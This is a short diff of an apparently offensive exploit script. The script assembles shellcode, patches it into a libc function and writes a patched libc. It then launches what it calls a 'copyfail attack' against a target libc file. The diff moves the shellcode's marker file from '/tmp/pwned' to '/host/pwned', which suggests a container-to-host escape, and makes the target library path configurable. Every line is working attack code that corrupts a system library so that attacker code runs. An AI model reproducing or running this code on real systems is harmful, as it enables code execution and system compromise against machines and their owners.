@@ -89,7 +89,7 @@ shellcode = asm(f"""
     ret
 """+r"""
 filename:
-    .ascii "/tmp/pwned\0"
+    .ascii "/host/pwned\0"
 """)
 
 binary.patch_address(func_va, list(shellcode))
@@ -107,7 +107,7 @@ print(f'Function {target_corrupt} patched -- total bytes: {len(shellcode_corrupt
 binary.write("libc-patched.so.6")
 
 # Launching copyfail attack
-target_file_to_patch = "/tmp/libc.so.6"
+target_file_to_patch = target_file # "/tmp/libc.so.6"
 f=g.open(target_file_to_patch,0);i=0;
 totalsize = g.path.getsize(target_file_to_patch)
 print(f'{target_file_to_patch} => size:', totalsize)
